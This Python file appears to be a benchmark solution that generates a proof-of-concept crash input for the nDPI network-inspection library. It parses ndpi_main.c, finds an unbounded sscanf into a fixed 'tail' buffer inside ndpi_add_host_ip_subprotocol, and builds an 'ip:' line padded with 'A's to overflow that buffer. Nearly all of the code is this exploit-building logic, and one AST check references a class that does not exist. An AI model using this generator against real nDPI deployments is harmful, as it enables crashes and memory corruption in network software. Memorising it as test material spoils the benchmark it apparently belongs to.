import os
import re
import tarfile
import codecs
from typing import Dict, Optional, List, Tuple


def _read_text_from_tar(tar: tarfile.TarFile, member_name: str, max_bytes: int = 50_000_000) -> Optional[str]:
    try:
        m = tar.getmember(member_name)
    except KeyError:
        return None
    f = tar.extractfile(m)
    if f is None:
        return None
    data = f.read(max_bytes + 1)
    if len(data) > max_bytes:
        data = data[:max_bytes]
    for enc in ("utf-8", "latin-1"):
        try:
            return data.decode(enc, errors="strict")
        except Exception:
            pass
    return data.decode("latin-1", errors="replace")


def _iter_tar_text_files(tar: tarfile.TarFile, suffixes=(".c", ".h", ".cc", ".cpp")):
    for m in tar.getmembers():
        if not m.isfile():
            continue
        name = m.name
        if name.endswith(suffixes):
            yield name


def _read_text_file(path: str, max_bytes: int = 50_000_000) -> Optional[str]:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            data = data[:max_bytes]
        for enc in ("utf-8", "latin-1"):
            try:
                return data.decode(enc, errors="strict")
            except Exception:
                pass
        return data.decode("latin-1", errors="replace")
    except Exception:
        return None


def _iter_dir_text_files(root: str, suffixes=(".c", ".h", ".cc", ".cpp")):
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn.endswith(suffixes):
                yield os.path.join(dirpath, fn)


def _scan_c_balanced(code: str, start: int, open_ch: str, close_ch: str) -> int:
    n = len(code)
    i = start
    if i >= n or code[i] != open_ch:
        return -1
    depth = 0
    state = 0  # 0 normal, 1 line comment, 2 block comment, 3 string, 4 char
    while i < n:
        c = code[i]
        if state == 0:
            if c == open_ch:
                depth += 1
            elif c == close_ch:
                depth -= 1
                if depth == 0:
                    return i
            elif c == '"':
                state = 3
            elif c == "'":
                state = 4
            elif c == "/" and i + 1 < n and code[i + 1] == "/":
                state = 1
                i += 1
            elif c == "/" and i + 1 < n and code[i + 1] == "*":
                state = 2
                i += 1
        elif state == 1:
            if c == "\n":
                state = 0
        elif state == 2:
            if c == "*" and i + 1 < n and code[i + 1] == "/":
                state = 0
                i += 1
        elif state == 3:
            if c == "\\":
                i += 1
            elif c == '"':
                state = 0
        elif state == 4:
            if c == "\\":
                i += 1
            elif c == "'":
                state = 0
        i += 1
    return -1


def _find_function_definition_block(code: str, func_name: str) -> Optional[Tuple[int, int, int, int]]:
    # returns (name_pos, sig_lparen_pos, body_lbrace_pos, body_rbrace_pos)
    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(")
    for m in pat.finditer(code):
        name_pos = m.start()
        lparen = code.find("(", m.end() - 1)
        if lparen < 0:
            continue
        rparen = _scan_c_balanced(code, lparen, "(", ")")
        if rparen < 0:
            continue
        j = rparen + 1
        while j < len(code) and code[j].isspace():
            j += 1
        if j >= len(code) or code[j] != "{":
            continue
        lbrace = j
        rbrace = _scan_c_balanced(code, lbrace, "{", "}")
        if rbrace < 0:
            continue
        return (name_pos, lparen, lbrace, rbrace)
    return None


def _split_c_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
    i = 0
    n = len(arg_str)
    while i < n:
        c = arg_str[i]
        if state == 0:
            if c == '"':
                state = 1
                cur.append(c)
            elif c == "'":
                state = 2
                cur.append(c)
            elif c == "/" and i + 1 < n and arg_str[i + 1] == "/":
                state = 3
                cur.append(c)
                cur.append(arg_str[i + 1])
                i += 1
            elif c == "/" and i + 1 < n and arg_str[i + 1] == "*":
                state = 4
                cur.append(c)
                cur.append(arg_str[i + 1])
                i += 1
            elif c == "(":
                depth_par += 1
                cur.append(c)
            elif c == ")":
                depth_par = max(0, depth_par - 1)
                cur.append(c)
            elif c == "[":
                depth_sq += 1
                cur.append(c)
            elif c == "]":
                depth_sq = max(0, depth_sq - 1)
                cur.append(c)
            elif c == "{":
                depth_br += 1
                cur.append(c)
            elif c == "}":
                depth_br = max(0, depth_br - 1)
                cur.append(c)
            elif c == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
                a = "".join(cur).strip()
                args.append(a)
                cur = []
            else:
                cur.append(c)
        elif state == 1:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                i += 1
                cur.append(arg_str[i])
            elif c == '"':
                state = 0
        elif state == 2:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                i += 1
                cur.append(arg_str[i])
            elif c == "'":
                state = 0
        elif state == 3:
            cur.append(c)
            if c == "\n":
                state = 0
        elif state == 4:
            cur.append(c)
            if c == "*" and i + 1 < n and arg_str[i + 1] == "/":
                cur.append(arg_str[i + 1])
                i += 1
                state = 0
        i += 1
    if cur:
        args.append("".join(cur).strip())
    return args


def _parse_c_string_literals(expr: str, macros_str: Dict[str, str]) -> Optional[str]:
    expr = expr.strip()
    if not expr:
        return None
    if re.fullmatch(r"[A-Za-z_]\w*", expr) and expr in macros_str:
        return macros_str[expr]

    parts = []
    i = 0
    n = len(expr)
    while i < n:
        while i < n and expr[i].isspace():
            i += 1
        if i >= n:
            break
        if expr[i] != '"':
            i += 1
            continue
        i += 1
        start = i
        buf = []
        while i < n:
            c = expr[i]
            if c == "\\" and i + 1 < n:
                buf.append(c)
                i += 1
                buf.append(expr[i])
                i += 1
                continue
            if c == '"':
                break
            buf.append(c)
            i += 1
        if i >= n or expr[i] != '"':
            break
        s = "".join(buf)
        try:
            decoded = codecs.decode(s.encode("latin-1", "backslashreplace"), "unicode_escape")
        except Exception:
            decoded = s
        parts.append(decoded)
        i += 1
    if not parts:
        return None
    return "".join(parts)


def _collect_macros_from_text(text: str) -> Tuple[Dict[str, int], Dict[str, str]]:
    macros_int: Dict[str, int] = {}
    macros_str: Dict[str, str] = {}
    for m in re.finditer(r'^[ \t]*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/\*.*)?$', text, re.M):
        name = m.group(1)
        val = m.group(2).strip()
        if val.startswith('"'):
            s = _parse_c_string_literals(val, {})
            if s is not None:
                macros_str[name] = s
            continue
        v = val
        v = re.sub(r"//.*", "", v).strip()
        v = re.sub(r"/\*.*?\*/", "", v).strip()
        v = re.sub(r"\b([0-9]+)[uUlL]+\b", r"\1", v)
        if re.fullmatch(r"0[xX][0-9a-fA-F]+|[0-9]+", v):
            try:
                macros_int[name] = int(v, 0)
            except Exception:
                pass
            continue
        if re.fullmatch(r"[A-Za-z_]\w*", v) and v in macros_int:
            macros_int[name] = macros_int[v]
    return macros_int, macros_str


def _safe_eval_int_expr(expr: str, macros_int: Dict[str, int]) -> Optional[int]:
    if expr is None:
        return None
    e = expr.strip()
    if not e:
        return None
    e = re.sub(r"/\*.*?\*/", "", e, flags=re.S)
    e = re.sub(r"//.*", "", e)
    e = re.sub(r"\b([0-9]+)[uUlL]+\b", r"\1", e)
    tokens = re.findall(r"[A-Za-z_]\w*|0[xX][0-9a-fA-F]+|[0-9]+|<<|>>|[()+\-*/%&|^~<>]", e)
    if not tokens:
        return None

    mapped = []
    for t in tokens:
        if re.fullmatch(r"[A-Za-z_]\w*", t):
            if t in macros_int:
                mapped.append(str(macros_int[t]))
            else:
                return None
        else:
            mapped.append(t)
    pe = "".join(mapped)
    pe = pe.replace("/", "//")

    import ast

    def eval_node(node):
        if isinstance(node, ast.Expression):
            return eval_node(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, int):
            return node.value
        if isinstance(node, ast.UnaryOp) and isinstance(node.op, (ast.UAdd, ast.USub, ast.Invert)):
            v = eval_node(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            return ~v
        if isinstance(node, ast.BinOp) and isinstance(
            node.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitAnd, ast.BitOr, ast.BitXor)
        ):
            a = eval_node(node.left)
            b = eval_node(node.right)
            if isinstance(node.op, ast.Add):
                return a + b
            if isinstance(node.op, ast.Sub):
                return a - b
            if isinstance(node.op, ast.Mult):
                return a * b
            if isinstance(node.op, ast.FloorDiv):
                if b == 0:
                    return None
                return a // b
            if isinstance(node.op, ast.Mod):
                if b == 0:
                    return None
                return a % b
            if isinstance(node.op, ast.LShift):
                return a << b
            if isinstance(node.op, ast.RShift):
                return a >> b
            if isinstance(node.op, ast.BitAnd):
                return a & b
            if isinstance(node.op, ast.BitOr):
                return a | b
            if isinstance(node.op, ast.BitXor):
                return a ^ b
        if isinstance(node, ast.ParenExpr):  # py3.12+
            return eval_node(node.expression)
        return None

    try:
        tree = ast.parse(pe, mode="eval")
        val = eval_node(tree)
        if isinstance(val, int):
            return val
    except Exception:
        return None
    return None


def _parse_scanf_format_specs(fmt: str):
    # returns list of dicts: {raw, conv, suppress, width, scanset, assigns_index, consumes_input}
    specs = []
    i = 0
    assigns_idx = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        j = i + 1
        suppress = False
        if j < n and fmt[j] == "*":
            suppress = True
            j += 1
        width = None
        wstart = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > wstart:
            try:
                width = int(fmt[wstart:j])
            except Exception:
                width = None
        # length modifiers
        if fmt.startswith("hh", j):
            j += 2
        elif fmt.startswith("ll", j):
            j += 2
        elif j < n and fmt[j] in "hljztL":
            j += 1
        if j >= n:
            break
        conv = fmt[j]
        scanset = None
        consumes_input = True
        j_end = j + 1
        if conv == "[":
            # scanset ends at matching ]
            k = j + 1
            if k < n and fmt[k] == "^":
                k += 1
            if k < n and fmt[k] == "]":
                k += 1
            while k < n and fmt[k] != "]":
                k += 1
            if k < n and fmt[k] == "]":
                scanset = fmt[j + 1 : k]
                j_end = k + 1
            else:
                scanset = fmt[j + 1 :]
                j_end = n
        elif conv == "n":
            consumes_input = False
        assigns_index = None
        if not suppress:
            assigns_index = assigns_idx
            assigns_idx += 1
        specs.append(
            {
                "i": i,
                "end": j_end,
                "conv": conv,
                "suppress": suppress,
                "width": width,
                "scanset": scanset,
                "assigns_index": assigns_index,
                "consumes_input": consumes_input,
            }
        )
        i = j_end
    return specs


def _char_for_scanset(scanset: str) -> str:
    # scanset is content between [ and ], may start with ^ for negation
    neg = False
    s = scanset
    if s.startswith("^"):
        neg = True
        s = s[1:]
    excluded = set()
    allowed = set()
    i = 0
    while i < len(s):
        c = s[i]
        # ranges a-z
        if i + 2 < len(s) and s[i + 1] == "-" and s[i + 2] != "]":
            a = ord(s[i])
            b = ord(s[i + 2])
            if a <= b:
                for o in range(a, b + 1):
                    allowed.add(chr(o))
            else:
                for o in range(b, a + 1):
                    allowed.add(chr(o))
            i += 3
            continue
        allowed.add(c)
        i += 1

    candidates = "Aa0Zz9._-:/@"
    if neg:
        excluded = allowed
        for c in candidates:
            if c not in excluded and c not in "\n\r\0":
                return c
        for o in range(33, 127):
            c = chr(o)
            if c not in excluded and c not in "\n\r\0":
                return c
        return "A"
    else:
        for c in candidates:
            if c in allowed and c not in "\n\r\0":
                return c
        if allowed:
            c = next(iter(allowed))
            if c not in "\n\r\0":
                return c
        return "A"


def _default_token_for_spec(spec: dict) -> str:
    conv = spec["conv"]
    if conv in "diuoxX":
        return "0"
    if conv in "aAeEfFgG":
        return "0"
    if conv == "p":
        return "0"
    if conv == "c":
        return "A"
    if conv == "s":
        return "A"
    if conv == "[":
        scanset = spec.get("scanset") or ""
        ch = _char_for_scanset(scanset)
        return ch
    if conv == "n":
        return ""
    # unknown: give a simple token
    return "A"


def _build_input_from_format(fmt: str, tail_assigns_index: int, tail_len: int) -> str:
    specs = _parse_scanf_format_specs(fmt)
    out = []
    last = 0
    for sp in specs:
        lit = fmt[last : sp["i"]]
        # Any whitespace in scanf format matches any amount of whitespace, so emit a single space
        if lit:
            # keep non-whitespace literals, compress whitespace to a single space
            buf = []
            ws = False
            for ch in lit:
                if ch.isspace():
                    ws = True
                else:
                    if ws:
                        buf.append(" ")
                        ws = False
                    buf.append(ch)
            if ws:
                buf.append(" ")
            out.append("".join(buf))
        token = None
        if sp["conv"] == "n":
            token = ""
        else:
            token = _default_token_for_spec(sp)
            if sp["assigns_index"] == tail_assigns_index:
                token = "A" * max(1, tail_len)
            else:
                if sp["conv"] == "[":
                    # Make it a bit longer to avoid empty matches, but still minimal
                    token = token * 1
        out.append(token)
        last = sp["end"]
    tail_lit = fmt[last:]
    if tail_lit:
        buf = []
        ws = False
        for ch in tail_lit:
            if ch.isspace():
                ws = True
            else:
                if ws:
                    buf.append(" ")
                    ws = False
                buf.append(ch)
        if ws:
            buf.append(" ")
        out.append("".join(buf))
    s = "".join(out)
    s = s.strip(" \t\r\n")
    return s


def _find_best_vulnerable_sscanf(func_body: str, tail_name: str, macros_int: Dict[str, int], macros_str: Dict[str, str]) -> Optional[dict]:
    # Find sscanf(...) calls inside func_body where one argument references tail_name
    # Return dict with keys: fmt, tail_arg_pos (non-suppressed assignments index), tail_decl_size
    # Prefer calls where corresponding tail spec has no width.
    # Also consider __isoc99_sscanf
    candidates = []
    for call_name in ("sscanf", "__isoc99_sscanf"):
        i = 0
        while True:
            j = func_body.find(call_name, i)
            if j < 0:
                break
            # ensure word boundary
            if j > 0 and (func_body[j - 1].isalnum() or func_body[j - 1] == "_"):
                i = j + 1
                continue
            k = j + len(call_name)
            while k < len(func_body) and func_body[k].isspace():
                k += 1
            if k >= len(func_body) or func_body[k] != "(":
                i = j + 1
                continue
            rpar = _scan_c_balanced(func_body, k, "(", ")")
            if rpar < 0:
                i = j + 1
                continue
            arg_str = func_body[k + 1 : rpar]
            args = _split_c_args(arg_str)
            if len(args) < 2:
                i = rpar + 1
                continue
            fmt = _parse_c_string_literals(args[1], macros_str)
            if not fmt:
                i = rpar + 1
                continue
            # identify tail argument position among non-suppressed assignments
            tail_pos_in_args = None
            for ai in range(2, len(args)):
                if re.search(r"\b" + re.escape(tail_name) + r"\b", args[ai]):
                    tail_pos_in_args = ai - 2  # position among conversion assignments arguments
                    break
            if tail_pos_in_args is None:
                i = rpar + 1
                continue

            specs = _parse_scanf_format_specs(fmt)
            # map assigns_index -> spec
            assigns_to_spec = {}
            for sp in specs:
                if sp["assigns_index"] is not None:
                    assigns_to_spec[sp["assigns_index"]] = sp
            if tail_pos_in_args not in assigns_to_spec:
                i = rpar + 1
                continue
            tail_spec = assigns_to_spec[tail_pos_in_args]
            # Vulnerable if no width limiting for %s or %[...]
            risky = (tail_spec["conv"] in ("s", "[")) and (tail_spec.get("width") is None)
            candidates.append(
                {
                    "fmt": fmt,
                    "tail_assigns_index": tail_pos_in_args,
                    "tail_spec": tail_spec,
                    "risky": risky,
                    "call_pos": j,
                }
            )
            i = rpar + 1

    if not candidates:
        return None
    risky = [c for c in candidates if c["risky"]]
    if risky:
        # Prefer the one where tail spec is last (simpler) and shorter format
        def key(c):
            specs = _parse_scanf_format_specs(c["fmt"])
            max_assign = max((sp["assigns_index"] for sp in specs if sp["assigns_index"] is not None), default=-1)
            is_last = 1 if c["tail_assigns_index"] == max_assign else 0
            return (-is_last, len(c["fmt"]))
        risky.sort(key=key)
        return risky[0]
    candidates.sort(key=lambda c: len(c["fmt"]))
    return candidates[0]


def _find_tail_decl_size(func_body: str, tail_name: str, macros_int: Dict[str, int]) -> Optional[int]:
    # Find "char tail[...]" within func_body
    for m in re.finditer(r"\bchar\s+" + re.escape(tail_name) + r"\s*\[\s*([^\]]+)\s*\]", func_body):
        expr = m.group(1).strip()
        val = _safe_eval_int_expr(expr, macros_int)
        if isinstance(val, int) and 1 <= val <= 1_000_000:
            return val
        if re.fullmatch(r"[0-9]+", expr):
            try:
                v = int(expr)
                if 1 <= v <= 1_000_000:
                    return v
            except Exception:
                pass
    return None


def _parse_func_signature_input_param_index(code: str, func_lparen: int, func_rparen: int) -> Optional[int]:
    sig = code[func_lparen + 1 : func_rparen]
    params = _split_c_args(sig)
    # Find the first param that looks like a char pointer (const char * or char *)
    for idx, p in enumerate(params):
        # Strip default-like attrs
        ps = p.strip()
        if not ps:
            continue
        if re.search(r"\bchar\b", ps) and "*" in ps and not re.search(r"\bunsigned\s+char\b", ps):
            return idx
    # fallback: any pointer param
    for idx, p in enumerate(params):
        ps = p.strip()
        if "*" in ps and "struct" not in ps:
            return idx
    return None


def _find_call_sites_prefix(code: str, func_name: str, def_block: Tuple[int, int, int, int], input_param_index: Optional[int]) -> List[str]:
    # Try to find likely prefixes by inspecting calls to func_name, especially those passing line+N / &line[N]
    name_pos, lparen, lbrace, rbrace = def_block
    prefixes = []
    i = 0
    while True:
        j = code.find(func_name, i)
        if j < 0:
            break
        # skip definition region
        if name_pos <= j <= rbrace:
            i = j + 1
            continue
        if j > 0 and (code[j - 1].isalnum() or code[j - 1] == "_"):
            i = j + 1
            continue
        k = j + len(func_name)
        while k < len(code) and code[k].isspace():
            k += 1
        if k >= len(code) or code[k] != "(":
            i = j + 1
            continue
        rpar = _scan_c_balanced(code, k, "(", ")")
        if rpar < 0:
            i = j + 1
            continue
        args = _split_c_args(code[k + 1 : rpar])
        if input_param_index is None or input_param_index >= len(args):
            i = rpar + 1
            continue
        arg = args[input_param_index].strip()
        # match line+N or &line[N] or buffer+N
        m1 = re.match(r"^\s*([A-Za-z_]\w*)\s*\+\s*(\d+)\s*$", arg)
        m2 = re.match(r"^\s*&\s*([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*$", arg)
        if not (m1 or m2):
            i = rpar + 1
            continue
        var = (m1 or m2).group(1)
        off = int((m1 or m2).group(2))
        if off <= 0 or off > 64:
            i = rpar + 1
            continue

        # Search backwards for a string literal used in strncmp(var, "prefix", off) or memcmp, etc.
        window_start = max(0, j - 2000)
        context = code[window_start:j]
        # Prefer the last match in context
        pat = re.compile(
            r"(?:strncmp|memcmp|strncasecmp)\s*\(\s*" + re.escape(var) + r"\s*,\s*\"((?:\\.|[^\"\\])*)\"\s*,\s*" + re.escape(str(off)) + r"\s*\)"
        )
        cand = None
        for mm in pat.finditer(context):
            cand = mm.group(1)
        if cand is not None:
            try:
                pref = codecs.decode(cand.encode("latin-1", "backslashreplace"), "unicode_escape")
            except Exception:
                pref = cand
            if len(pref) == off:
                prefixes.append(pref)
        else:
            # common offsets
            if off == 3:
                prefixes.append("ip:")
            elif off == 5:
                prefixes.append("host:")
        i = rpar + 1

    # De-dup preserving order
    seen = set()
    out = []
    for p in prefixes:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


class Solution:
    def solve(self, src_path: str) -> bytes:
        ndpi_main_code = None
        macros_int: Dict[str, int] = {}
        macros_str: Dict[str, str] = {}

        if os.path.isdir(src_path):
            # locate ndpi_main.c
            target = None
            for p in _iter_dir_text_files(src_path):
                if p.replace("\\", "/").endswith("src/lib/ndpi_main.c") or p.replace("\\", "/").endswith("/ndpi_main.c"):
                    target = p
                    break
            if target:
                ndpi_main_code = _read_text_file(target)
            else:
                # attempt broad search by filename
                for p in _iter_dir_text_files(src_path):
                    if os.path.basename(p) == "ndpi_main.c":
                        ndpi_main_code = _read_text_file(p)
                        if ndpi_main_code:
                            break
            if ndpi_main_code:
                mi, ms = _collect_macros_from_text(ndpi_main_code)
                macros_int.update(mi)
                macros_str.update(ms)
        else:
            try:
                if tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path, "r:*") as tar:
                        # find ndpi_main.c
                        member = None
                        for name in tar.getnames():
                            n = name.replace("\\", "/")
                            if n.endswith("src/lib/ndpi_main.c") or n.endswith("/ndpi_main.c"):
                                member = name
                                if n.endswith("src/lib/ndpi_main.c"):
                                    break
                        if member:
                            ndpi_main_code = _read_text_from_tar(tar, member)
                            if ndpi_main_code:
                                mi, ms = _collect_macros_from_text(ndpi_main_code)
                                macros_int.update(mi)
                                macros_str.update(ms)
                        # collect more macros if needed
                        if ndpi_main_code and (not macros_int or not macros_str):
                            for name in _iter_tar_text_files(tar):
                                if name == member:
                                    continue
                                if name.endswith((".h", ".c")):
                                    txt = _read_text_from_tar(tar, name, max_bytes=2_000_000)
                                    if not txt:
                                        continue
                                    mi, ms = _collect_macros_from_text(txt)
                                    macros_int.update(mi)
                                    macros_str.update(ms)
                else:
                    ndpi_main_code = None
            except Exception:
                ndpi_main_code = None

        if not ndpi_main_code:
            # fallback heuristic
            payload = b"ip:0.0.0.0/0" + (b"A" * 64) + b"\n"
            return payload[:256]

        def_block = _find_function_definition_block(ndpi_main_code, "ndpi_add_host_ip_subprotocol")
        if not def_block:
            payload = b"ip:0.0.0.0/0" + (b"A" * 64) + b"\n"
            return payload[:256]

        name_pos, sig_lparen, body_lbrace, body_rbrace = def_block
        func_body = ndpi_main_code[body_lbrace : body_rbrace + 1]

        tail_name = "tail"
        # verify tail exists, else try to find a similar local var used in sscanf
        if not re.search(r"\bchar\s+" + re.escape(tail_name) + r"\s*\[", func_body):
            m = re.search(r"\bchar\s+([A-Za-z_]\w*)\s*\[([^\]]+)\]\s*;\s*", func_body)
            if m:
                tail_name = m.group(1)

        # ensure we have macros, possibly from headers in directory mode too
        if os.path.isdir(src_path) and (not macros_int or not macros_str):
            for p in _iter_dir_text_files(src_path):
                txt = _read_text_file(p, max_bytes=2_000_000)
                if not txt:
                    continue
                mi, ms = _collect_macros_from_text(txt)
                macros_int.update(mi)
                macros_str.update(ms)

        vuln = _find_best_vulnerable_sscanf(func_body, tail_name, macros_int, macros_str)
        tail_size = _find_tail_decl_size(func_body, tail_name, macros_int)
        if tail_size is None:
            tail_size = 32

        if not vuln:
            # fallback to a plausible pattern for common CIDR parsing
            val = "0.0.0.0/0" + ("A" * tail_size)
            for pref in ("ip:", "host:", ""):
                s = (pref + val + "\n").encode("ascii", errors="ignore")
                if len(s) <= 4096:
                    return s
            return (val + "\n").encode("ascii", errors="ignore")

        fmt = vuln["fmt"]
        tail_assigns_index = vuln["tail_assigns_index"]

        # Overflow by 1 byte via NUL terminator: provide exactly tail_size chars
        tail_len = max(1, tail_size)

        value = _build_input_from_format(fmt, tail_assigns_index, tail_len)

        # Determine likely prefix
        func_rparen = _scan_c_balanced(ndpi_main_code, sig_lparen, "(", ")")
        input_param_index = _parse_func_signature_input_param_index(ndpi_main_code, sig_lparen, func_rparen) if func_rparen > 0 else None
        prefixes = _find_call_sites_prefix(ndpi_main_code, "ndpi_add_host_ip_subprotocol", def_block, input_param_index)

        # Prefer ip: if present
        prefix = ""
        if prefixes:
            if "ip:" in prefixes:
                prefix = "ip:"
            elif "host:" in prefixes:
                prefix = "host:"
            else:
                prefix = prefixes[0]
        else:
            # educated guess
            prefix = "ip:"

        line = (prefix + value).strip("\r\n") + "\n"
        out = line.encode("ascii", errors="ignore")

        # If suspiciously empty or too short, add safe minimal padding lines without growing too much
        if len(out) < 8:
            out = (prefix + "0.0.0.0/0" + ("A" * tail_len) + "\n").encode("ascii", errors="ignore")

        return out[:4096]